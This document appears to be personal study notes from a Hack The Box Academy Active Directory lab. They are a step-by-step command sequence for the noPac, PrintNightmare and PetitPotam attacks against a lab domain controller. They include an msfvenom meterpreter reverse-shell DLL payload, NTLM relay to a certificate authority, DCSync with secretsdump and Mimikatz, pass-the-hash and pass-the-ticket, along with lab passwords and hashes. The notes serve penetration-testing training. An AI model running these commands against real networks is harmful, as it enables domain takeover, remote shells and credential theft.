#### Cloning the NoPac Exploit Repo

```shell
3kjS@htb[/htb]$ git clone https://github.com/Ridter/noPac.git
```
#### Scanning for NoPac

```shell
3kjS@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
#### Running NoPac & Getting a Shell

```shell
3kjS@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
#### Confirming the Location of Saved Tickets

```shell
3kjS@htb[/htb]$ ls 
administrator_DC01.INLANEFREIGHT.local.ccache noPac.py requirements.txt utils README.md scanner.py
```
#### Using noPac to DCSync the Built-in Administrator Account

```shell
3kjS@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```
## Windows Defender & SMBEXEC.py Considerations
#### Windows Defender Quarantine Log
![](Pasted%20image%2020260530213821.png)
## PrintNightmare
#### Cloning the Exploit

```shell
3kjS@htb[/htb]$ git clone https://github.com/cube0x0/CVE-2021-1675.git
```
#### Install cube0x0's Version of Impacket

```shell
pip3 uninstall impacket 
git clone https://github.com/cube0x0/impacket 
cd impacket 
python3 ./setup.py install
```
#### Enumerating for MS-RPRN

```shell
3kjS@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```
#### Generating a DLL Payload

```shell
3kjS@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```
#### Creating a Share with smbserver.py

```shell
3kjS@htb[/htb]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```
#### Configuring & Starting MSF multi/handler
![](Screenshot%202026-05-30%20at%2021.40.10.png)
#### Running the Exploit

```shell
3kjS@htb[/htb]$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```
## PetitPotam (MS-EFSRPC)
#### Starting ntlmrelayx.py

```shell
3kjS@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```
#### Running PetitPotam.py

```shell
3kjS@htb[/htb]$ python3 PetitPotam.py 172.16.5.225 172.16.5.5
```
#### Catching Base64 Encoded Certificate for DC01

```shell
3kjS@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```
![](Screenshot%202026-05-30%20at%2021.41.23.png)
#### Requesting a TGT Using gettgtpkinit.py

```shell
3kjS@htb[/htb]$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```
#### Setting the KRB5CCNAME Environment Variable

```shell
3kjS@htb[/htb]$ export KRB5CCNAME=dc01.ccache
```
#### Using Domain Controller TGT to DCSync

```shell
3kjS@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
![](Screenshot%202026-05-30%20at%2021.42.23.png)
#### Running klist

```shell
3kjS@htb[/htb]$ klist
```
![](Screenshot%202026-05-30%20at%2021.42.42.png)
#### Confirming Admin Access to the Domain Controller

```shell
3kjS@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```
#### Submitting a TGS Request for Ourselves Using getnthash.py

```shell
3kjS@htb[/htb]$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```
#### Using Domain Controller NTLM Hash to DCSync

```shell
3kjS@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```
#### Requesting TGT and Performing PTT with DC01$ Machine Account

```powershell
PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
```
#### Confirming the Ticket is in Memory

```powershell
PS C:\Tools> klist
```
#### Performing DCSync with Mimikatz

```powershell
PS C:\Tools> cd .\mimikatz\x64\ 
PS C:\Tools\mimikatz\x64> .\mimikatz.exe
```
![](Screenshot%202026-05-30%20at%2021.45.57.png)
